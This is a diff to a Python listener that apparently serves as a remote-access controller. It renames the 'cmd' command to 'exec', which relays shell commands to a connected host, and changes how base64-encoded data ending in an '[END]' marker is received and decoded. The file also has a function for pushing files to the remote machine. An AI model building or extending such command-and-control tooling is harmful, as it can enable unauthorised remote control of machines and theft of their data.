@@ -170,21 +170,20 @@ def file_transfer_put(conn, commands):       #push file to server
     conn.send("[END]".encode('utf-8'))
     f.close()
 
-def listen_for_data(conn, mode="print"):
+def listen_for_data(conn, mode="print",encoding="b64"):
     if DEBUG:
         print_info("Waiting for data")
     data = ""
-    data_b64 = ""
     while not data.endswith('[END]'):
         recv = conn.recv(128)
         recv_decoded = recv.decode('utf-8')
-        data_b64 = data_b64 + recv_decoded
-
-        recv_decoded = base64_decode(recv.decode('utf-8'))
         data = data + recv_decoded
+            
+    if encoding == "b64":
+        data = base64_decode(data)
 
     if DEBUG:
-        print(data_b64)
+        print(data)
 
     if mode != "print":
         return data.rstrip("[END]")
@@ -518,9 +517,9 @@ def listen():
                         cmd = ""
                 elif cmd == "":
                     pass
-                elif cmd.split()[0] == "cmd":
+                elif cmd.split()[0] == "exec":
                     data = ""
-                    new_cmd = cmd.replace("cmd ","")
+                    new_cmd = cmd.replace("exec ","")
                     send_data(conn, new_cmd)
                     if VERBOSE:
                         print_info("Waiting for data...")
